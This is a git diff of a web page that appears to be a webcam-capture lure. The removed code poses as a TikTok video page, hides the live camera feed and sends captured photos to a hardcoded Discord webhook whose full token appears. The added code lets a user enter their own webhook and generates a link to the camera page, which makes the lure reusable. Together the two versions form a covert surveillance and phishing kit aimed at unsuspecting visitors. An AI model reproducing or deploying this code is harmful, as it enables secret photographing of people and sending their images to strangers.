@@ -3,178 +3,68 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tiktok Video</title>
+    <title>Enter Webhook</title>
     <style>
         body {
-            margin: 0;
             background: linear-gradient(to bottom, #000, #111);
             font-family: 'Poppins', sans-serif;
             color: white;
             text-align: center;
-            overflow: hidden;
+            padding: 50px;
         }
         h1 {
             font-size: 2rem;
             color: #fff;
-            margin-top: 20px;
-            text-shadow: 0 0 5px #f0f, 0 0 10px #0ff;
         }
-        video {
+        input {
+            padding: 10px;
+            font-size: 1rem;
+            border-radius: 10px;
             margin-top: 20px;
-            width: 90%;
-            max-width: 400px;
-            border: 10px solid;
-            border-image: linear-gradient(to right, #f0f, #0ff, #f0f) 1;
-            border-radius: 20px;
-            box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
-            opacity: 0;  /* Adjust this value (0 to 1) for desired opacity */
+            width: 80%;
         }
         button {
             margin-top: 20px;
             padding: 10px 20px;
             font-size: 1rem;
             border: none;
-            border-radius: 25px;
+            border-radius: 10px;
             background: linear-gradient(to right, #f0f, #0ff);
             color: white;
             cursor: pointer;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
             transition: transform 0.2s, box-shadow 0.2s;
         }
         button:hover {
             transform: scale(1.05);
-            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.4);
-        }
-        button:active {
-            transform: scale(0.95);
-        }
-        #loadingIndicator {
-            display: none;
-            margin: 20px auto;
-            width: 50px;
-            height: 50px;
-            border: 5px solid rgba(255, 255, 255, 0.2);
-            border-top: 5px solid #fff;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
-    <h1>Unofficial TikTok Camera</h1>
-    <video id="webcam" autoplay></video>
-    <div id="loadingIndicator"></div>
-    <button id="captureButton">Capture</button>
-    <p id="message"></p>
-    <canvas id="canvas"></canvas>
+    <h1>Enter Your Discord Webhook URL</h1>
+    <input type="text" id="webhookInput" placeholder="Enter webhook URL here" />
+    <br>
+    <button id="generateLinkButton">Generate Link</button>
+    <p id="linkMessage"></p>
 
     <script>
-        const video = document.getElementById('webcam');
-        const captureButton = document.getElementById('captureButton');
-        const message = document.getElementById('message');
-        const canvas = document.getElementById('canvas');
-        const loadingIndicator = document.getElementById('loadingIndicator');
-        const ctx = canvas.getContext('2d');
+        const webhookInput = document.getElementById('webhookInput');
+        const generateLinkButton = document.getElementById('generateLinkButton');
+        const linkMessage = document.getElementById('linkMessage');
 
-        // Your Discord webhook URL
-        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1328823824275214336/zvW9MAN890FiTSeo53UINP2aHDjjBRxzXSHYzbggJiSfQdOS94XjH8Ex-aEfaUQy9TJ8";
-
-        let currentStream = null; // Hold the stream globally
-
-        // Function to check if the device is mobile
-        function isMobile() {
-            return window.innerWidth <= 800; // Assuming anything below 800px is a mobile device
-        }
-
-        // Function to start the camera with specified facingMode
-        async function startCamera(facingMode) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: facingMode },
-                });
-                video.srcObject = stream;
-                currentStream = stream; // Store the current stream
-                return stream;
-            } catch (err) {
-                message.textContent = 'Error accessing webcam: ' + err.message;
-                return null;
-            }
-        }
-
-        // Function to capture and send the image to Discord
-        async function captureAndSendImage() {
-            if (!currentStream) {
-                message.textContent = "No active camera stream.";
+        // Generate and redirect user to camera page with their webhook
+        generateLinkButton.addEventListener('click', () => {
+            const webhookUrl = webhookInput.value.trim();
+            if (!webhookUrl) {
+                linkMessage.textContent = "Please enter a valid webhook URL.";
                 return;
             }
 
-            // Ensure the video stream is still active
-            if (video.srcObject && video.srcObject.active === false) {
-                message.textContent = "Camera stream is no longer active.";
-                return;
-            }
+            // Save the webhook URL in localStorage
+            localStorage.setItem('userWebhook', webhookUrl);
 
-            // Set canvas size to match the video
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            // Convert the captured image to a Blob
-            return new Promise((resolve, reject) => {
-                canvas.toBlob(blob => {
-                    if (!blob) {
-                        reject("Failed to capture image.");
-                        return;
-                    }
-                    const formData = new FormData();
-                    formData.append('file', blob, 'camera-image.png');
-                    formData.append('payload_json', JSON.stringify({
-                        content: "Preview your captured image!"
-                    }));
-
-                    fetch(DISCORD_WEBHOOK_URL, {
-                        method: 'POST',
-                        body: formData,
-                    })
-                    .then(response => {
-                        if (response.ok) {
-                            resolve("Image sent successfully to Discord!");
-                        } else {
-                            reject("Failed to send image to Discord.");
-                        }
-                    })
-                    .catch(err => reject("Error sending image to Discord: " + err));
-                }, 'image/png');
-            });
-        }
-
-        // Main event listener for capturing and sending images
-        captureButton.addEventListener('click', async () => {
-            message.textContent = '';
-            loadingIndicator.style.display = 'block';
-
-            try {
-                await captureAndSendImage();
-                message.textContent = "Capture successful! Check Discord.";
-            } catch (err) {
-                message.textContent = err;
-            }
-
-            loadingIndicator.style.display = 'none';
-        });
-
-        // Initialize the camera on page load
-        window.addEventListener('load', async () => {
-            const stream = await startCamera('user');
-            if (stream) {
-                console.log("Camera is ready.");
-            } else {
-                console.error("Failed to access camera.");
-            }
+            // Generate the special link and display it
+            const cameraLink = `${window.location.origin}/camera.html`;
+            linkMessage.innerHTML = `Click here to go to your camera: <a href="${cameraLink}" target="_blank">${cameraLink}</a>`;
         });
     </script>
 </body>
